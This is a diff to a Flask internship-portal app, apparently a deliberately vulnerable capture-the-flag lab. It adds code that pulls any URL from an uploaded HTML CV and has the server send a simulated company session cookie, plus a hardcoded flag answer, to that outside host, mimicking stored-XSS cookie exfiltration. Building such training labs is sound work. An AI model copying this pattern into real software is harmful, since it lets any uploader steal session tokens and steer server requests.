@@ -9,9 +9,13 @@ from flask import (
 from functools import wraps
 import json
 import hashlib
+import re
 import secrets
 import os
 from datetime import datetime
+from urllib.request import urlopen, Request
+from urllib.parse import quote
+from urllib.error import URLError
 import jwt
 from werkzeug.utils import secure_filename
 from dotenv import load_dotenv
@@ -601,6 +605,8 @@ def logout():
 @login_required
 def student_dashboard():
     user = get_current_user()
+    if user.get('role') == 'company':
+        return redirect(url_for('company_dashboard'))
     # Cargar ofertas activas
     offers = []
     for key in db.keys('offer:*'):
@@ -643,8 +649,30 @@ def upload_cv():
     })
 
 
+def _extract_webhook_from_html(filepath):
+    """Extrae la primera URL tipo webhook (http(s)) del archivo, para simular exfiltración."""
+    try:
+        with open(filepath, 'rb') as f:
+            header = f.read(5)
+        if header == b'%PDF-':
+            return None
+        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+        # Buscar URLs http(s) en el contenido (p. ej. var w = "https://webhook.site/...")
+        match = re.search(r'https?://[^\s"\'<>)\];]+', content)
+        if not match:
+            return None
+        url = match.group(0).rstrip('.,;:')
+        # No enviar a localhost ni a nosotros mismos
+        if 'localhost' in url or '127.0.0.1' in url:
+            return None
+        return url
+    except Exception:
+        return None
+
+
 def process_cv(filename):
-    """Proceso automático que simula la revisión del CV por parte del sistema."""
+    """Proceso automático que simula la revisión del CV por parte del sistema (empresa abre el CV)."""
     company = db.hgetall('company:1')
     if company:
         bot_session = secrets.token_hex(32)
@@ -663,6 +691,20 @@ def process_cv(filename):
         })
 
         log_entry(f"CV revisado automáticamente — Sesión del bot: {bot_session} — Archivo: {filename}")
+
+        # Simular que la empresa abrió el CV: si el archivo es HTML con webhook, enviar la cookie de la empresa
+        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        if os.path.exists(filepath):
+            webhook = _extract_webhook_from_html(filepath)
+            if webhook:
+                flag_act2 = 'FLAG{stored_xss_persisted}'
+                cookie_value = f"session_token={bot_session}"
+                exfil_url = f"{webhook.rstrip('/')}?c={quote(cookie_value)}&flag={quote(flag_act2)}"
+                try:
+                    req = Request(exfil_url, headers={'User-Agent': 'Mozilla/5.0 (compatible; InternLink/1.0)'})
+                    urlopen(req, timeout=5)
+                except (URLError, OSError):
+                    pass
 
 
 @app.route('/view-cv/<filename>')
